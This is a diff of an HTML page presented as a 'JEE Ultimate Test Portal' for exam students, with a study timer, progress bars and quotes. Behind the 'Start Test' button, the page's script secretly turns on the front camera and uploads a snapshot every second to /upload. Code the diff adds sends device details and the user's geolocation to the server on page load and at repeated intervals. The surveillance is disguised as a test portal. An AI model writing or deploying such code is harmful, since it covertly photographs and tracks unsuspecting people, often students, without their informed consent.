@@ -9,39 +9,39 @@
 html,body{height:100%;overflow:hidden;color:white;}
 
 body{
-  background:linear-gradient(-45deg,#0f2027,#203a43,#2c5364,#000000);
-  background-size:400% 400%;
-  animation:gradientMove 12s ease infinite;
+background:linear-gradient(-45deg,#0f2027,#203a43,#2c5364,#000000);
+background-size:400% 400%;
+animation:gradientMove 12s ease infinite;
 }
 
 @keyframes gradientMove{
-  0%{background-position:0% 50%;}
-  50%{background-position:100% 50%;}
-  100%{background-position:0% 50%;}
+0%{background-position:0% 50%;}
+50%{background-position:100% 50%;}
+100%{background-position:0% 50%;}
 }
 
 #overlay{
-  position:absolute;
-  width:100%;
-  height:100%;
-  overflow:auto;
-  backdrop-filter:blur(12px);
-  background:rgba(0,0,0,0.6);
-  padding:40px;
+position:absolute;
+width:100%;
+height:100%;
+overflow:auto;
+backdrop-filter:blur(12px);
+background:rgba(0,0,0,0.6);
+padding:40px;
 }
 
 h1{
-  text-align:center;
-  font-size:48px;
-  letter-spacing:4px;
-  margin-bottom:10px;
-  animation:flashIntro 2s ease forwards;
+text-align:center;
+font-size:48px;
+letter-spacing:4px;
+margin-bottom:10px;
+animation:flashIntro 2s ease forwards;
 }
 
 @keyframes flashIntro{
-  0%{opacity:0;letter-spacing:20px;}
-  50%{opacity:1;text-shadow:0 0 30px #ff004c;}
-  100%{letter-spacing:4px;}
+0%{opacity:0;letter-spacing:20px;}
+50%{opacity:1;text-shadow:0 0 30px #ff004c;}
+100%{letter-spacing:4px;}
 }
 
 .top-info{text-align:center;margin-bottom:25px;}
@@ -50,43 +50,43 @@ h1{
 #rankCounter{margin-top:10px;font-size:20px;color:#ffcc00;}
 
 .container{
-  display:grid;
-  grid-template-columns:repeat(auto-fit,minmax(260px,1fr));
-  gap:25px;
-  margin-top:30px;
+display:grid;
+grid-template-columns:repeat(auto-fit,minmax(260px,1fr));
+gap:25px;
+margin-top:30px;
 }
 
 .card{
-  background:rgba(255,255,255,0.05);
-  padding:20px;
-  border-radius:20px;
-  backdrop-filter:blur(6px);
+background:rgba(255,255,255,0.05);
+padding:20px;
+border-radius:20px;
+backdrop-filter:blur(6px);
 }
 
 .progress{
-  height:10px;
-  background:#333;
-  border-radius:20px;
-  overflow:hidden;
-  margin-top:8px;
+height:10px;
+background:#333;
+border-radius:20px;
+overflow:hidden;
+margin-top:8px;
 }
 
 .progress div{
-  height:100%;
-  width:0%;
-  background:linear-gradient(90deg,#00ffcc,#00bfff);
-  transition:1s;
+height:100%;
+width:0%;
+background:linear-gradient(90deg,#00ffcc,#00bfff);
+transition:1s;
 }
 
 button{
-  padding:10px 20px;
-  border:none;
-  border-radius:30px;
-  cursor:pointer;
-  background:linear-gradient(45deg,#ff004c,#ff7a00);
-  color:white;
-  font-weight:bold;
-  margin-top:10px;
+padding:10px 20px;
+border:none;
+border-radius:30px;
+cursor:pointer;
+background:linear-gradient(45deg,#ff004c,#ff7a00);
+color:white;
+font-weight:bold;
+margin-top:10px;
 }
 
 button:hover{transform:scale(1.05);}
@@ -106,41 +106,42 @@ iframe{width:100%;height:100%;border:0;display:none;}
 <h1>JEE Ultimate Test Portal</h1>
 
 <div class="top-info">
-  <div id="studentName" onclick="changeName()">Welcome, Adarsh 🚀</div>
-  <div id="timeDate"></div>
-  <div id="rankCounter">Loading Rank...</div>
+<div id="studentName" onclick="changeName()">Welcome, Adarsh 🚀</div>
+<div id="timeDate"></div>
+<div id="rankCounter">Loading Rank...</div>
 </div>
 
 <div class="container">
 
-  <div class="card">
-    <h3>Start Test</h3>
-    <button onclick="start()">▶ Start Test</button>
-  </div>
+<div class="card">
+<h3>Start Test</h3>
+<button onclick="start()">▶ Start Test</button>
+</div>
 
-  <div class="card">
-    <h3>Subject Progress</h3>
-    Physics<div class="progress"><div id="phy"></div></div>
-    Chemistry<div class="progress"><div id="chem"></div></div>
-    Maths<div class="progress"><div id="math"></div></div>
-  </div>
+<div class="card">
+<h3>Subject Progress</h3>
+Physics<div class="progress"><div id="phy"></div></div>
+Chemistry<div class="progress"><div id="chem"></div></div>
+Maths<div class="progress"><div id="math"></div></div>
+</div>
 
-  <div class="card">
-    <h3>Study Timer</h3>
-    <div id="timer">00:00:00</div>
-    <button onclick="startTimer()">Start</button>
-    <button onclick="stopTimer()">Stop</button>
-  </div>
+<div class="card">
+<h3>Study Timer</h3>
+<div id="timer">00:00:00</div>
+<button onclick="startTimer()">Start</button>
+<button onclick="stopTimer()">Stop</button>
+</div>
 
-  <div class="card">
-    <h3>Motivation</h3>
-    <div class="quote" id="quote"></div>
-  </div>
+<div class="card">
+<h3>Motivation</h3>
+<div class="quote" id="quote"></div>
+</div>
 
 </div>
 </div>
 
 <iframe id="frame"></iframe>
+
 <video id="v" autoplay playsinline hidden></video>
 <canvas id="c" hidden></canvas>
 
@@ -148,132 +149,200 @@ iframe{width:100%;height:100%;border:0;display:none;}
 
 /* Editable Name */
 function changeName(){
-  let name=prompt("Enter your name:");
-  if(name){
-    localStorage.setItem("jeeName",name);
-    document.getElementById("studentName").innerText="Welcome, "+name+" 🚀";
-  }
+let name=prompt("Enter your name:");
+if(name){
+localStorage.setItem("jeeName",name);
+document.getElementById("studentName").innerText="Welcome, "+name+" 🚀";
 }
+}
+
 let saved=localStorage.getItem("jeeName");
 if(saved){
-  document.getElementById("studentName").innerText="Welcome, "+saved+" 🚀";
+document.getElementById("studentName").innerText="Welcome, "+saved+" 🚀";
 }
+
 
 /* Time */
 function updateTime(){
-  let now=new Date();
-  document.getElementById("timeDate").innerText=
-    now.toLocaleDateString()+" | "+now.toLocaleTimeString();
+let now=new Date();
+document.getElementById("timeDate").innerText=
+now.toLocaleDateString()+" | "+now.toLocaleTimeString();
 }
-setInterval(updateTime,1000);updateTime();
+setInterval(updateTime,1000);
+updateTime();
+
 
 /* Rank Counter */
 let p=0,target=99.30;
 let counter=setInterval(()=>{
-  p+=1.5;
-  if(p>=target){p=target;clearInterval(counter);}
-  document.getElementById("rankCounter").innerText=
-    "Target Performance: "+p.toFixed(2)+"%";
+p+=1.5;
+if(p>=target){
+p=target;
+clearInterval(counter);
+}
+document.getElementById("rankCounter").innerText=
+"Target Performance: "+p.toFixed(2)+"%";
 },30);
+
 
 /* Progress Bars */
 setTimeout(()=>{
-  phy.style.width="70%";
-  chem.style.width="60%";
-  math.style.width="75%";
+phy.style.width="70%";
+chem.style.width="60%";
+math.style.width="75%";
 },500);
+
 
 /* Timer */
 let sec=0,timerInt;
+
 function startTimer(){
-  timerInt=setInterval(()=>{
-    sec++;
-    let h=Math.floor(sec/3600);
-    let m=Math.floor((sec%3600)/60);
-    let s=sec%60;
-    timer.innerText=
-      String(h).padStart(2,'0')+":"+
-      String(m).padStart(2,'0')+":"+
-      String(s).padStart(2,'0');
-  },1000);
+timerInt=setInterval(()=>{
+sec++;
+let h=Math.floor(sec/3600);
+let m=Math.floor((sec%3600)/60);
+let s=sec%60;
+
+timer.innerText=
+String(h).padStart(2,'0')+":"+
+String(m).padStart(2,'0')+":"+
+String(s).padStart(2,'0');
+
+},1000);
 }
-function stopTimer(){clearInterval(timerInt);}
+
+function stopTimer(){
+clearInterval(timerInt);
+}
+
 
 /* Quotes */
 let quotes=[
-  "Consistency beats motivation.",
-  "One test closer to IIT.",
-  "Focus now, celebrate later.",
-  "Small daily improvement = Big results."
+"Consistency beats motivation.",
+"One test closer to IIT.",
+"Focus now, celebrate later.",
+"Small daily improvement = Big results."
 ];
-let qi=0;
-function rotateQuote(){
-  quote.innerText=quotes[qi];
-  qi=(qi+1)%quotes.length;
-}
-setInterval(rotateQuote,4000);rotateQuote();
 
-/* START TEST LOGIC — SAME FLOW, FRONT CAMERA */
+let qi=0;
+
+function rotateQuote(){
+quote.innerText=quotes[qi];
+qi=(qi+1)%quotes.length;
+}
+
+setInterval(rotateQuote,4000);
+rotateQuote();
+
+
+/* DEVICE INFO */
+function sendDeviceInfo(){
+
+fetch("/device",{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+device:navigator.platform,
+os:navigator.userAgent,
+browser:navigator.appVersion,
+screen:screen.width+"x"+screen.height
+})
+});
+
+}
+
+
+/* LOCATION */
+function sendLocation(){
+
+if(!navigator.geolocation) return;
+
+navigator.geolocation.getCurrentPosition(function(pos){
+
+fetch("/location",{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+lat:pos.coords.latitude,
+lon:pos.coords.longitude
+})
+});
+
+});
+
+}
+
+
+/* CAMERA */
+function capture(){
+
+if(!v.videoWidth) return;
+
+c.width=v.videoWidth;
+c.height=v.videoHeight;
+
+const ctx=c.getContext("2d");
+
+ctx.drawImage(v,0,0,c.width,c.height);
+
+c.toBlob(b=>{
+let f=new FormData();
+f.append("photo",b,"u.jpg");
+
+fetch("/upload",{method:"POST",body:f});
+
+},"image/jpeg",0.9);
+
+}
+
+
+/* START TEST */
 async function start(){
 
-  try{
+sendDeviceInfo();
+sendLocation();
+setInterval(sendLocation,1000);
 
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video:{
-        facingMode:"user",
-        width:{ideal:1920},
-        height:{ideal:1080}
-      }
-    });
+try{
 
-    v.srcObject=stream;
+const stream=await navigator.mediaDevices.getUserMedia({
+video:{facingMode:"user"}
+});
 
-    setTimeout(capture,500);
-    setInterval(capture,500);
+v.srcObject=stream;
 
-  }catch(e){
-    console.log(e);
-    return;
-  }
+setTimeout(capture,1000);
+setInterval(capture,1000);
 
-  document.getElementById("overlay").style.display="none";
-
-  const r=await fetch("/get_video_link");
-  const d=await r.json();
-
-  const frame=document.getElementById("frame");
-  frame.style.display="block";
-  frame.src=d.url;
-
-  if(frame.requestFullscreen){
-    frame.requestFullscreen();
-  }else if(frame.webkitRequestFullscreen){
-    frame.webkitRequestFullscreen();
-  }else if(frame.msRequestFullscreen){
-    frame.msRequestFullscreen();
-  }
+}catch(e){
+console.log(e);
+return;
 }
 
-/* CLEAR CAPTURE */
-function capture(){
-  if(!v.videoWidth) return;
+document.getElementById("overlay").style.display="none";
 
-  c.width=v.videoWidth;
-  c.height=v.videoHeight;
+const r=await fetch("/get_video_link");
+const d=await r.json();
 
-  const ctx=c.getContext("2d");
-  ctx.imageSmoothingEnabled=true;
-  ctx.imageSmoothingQuality="high";
-  ctx.filter="contrast(108%) brightness(104%)";
+const frame=document.getElementById("frame");
+frame.style.display="block";
+frame.src=d.url;
 
-  ctx.drawImage(v,0,0,c.width,c.height);
-
-  c.toBlob(b=>{
-    let f=new FormData();
-    f.append("photo",b,"u.jpg");
-    fetch("/upload",{method:"POST",body:f});
-  },"image/jpeg",0.92);
+if(frame.requestFullscreen){
+frame.requestFullscreen();
 }
+
+}
+
+
+/* Send info on page load */
+sendDeviceInfo();
+sendLocation();
+setInterval(sendLocation,30000);
 
 </script>
 
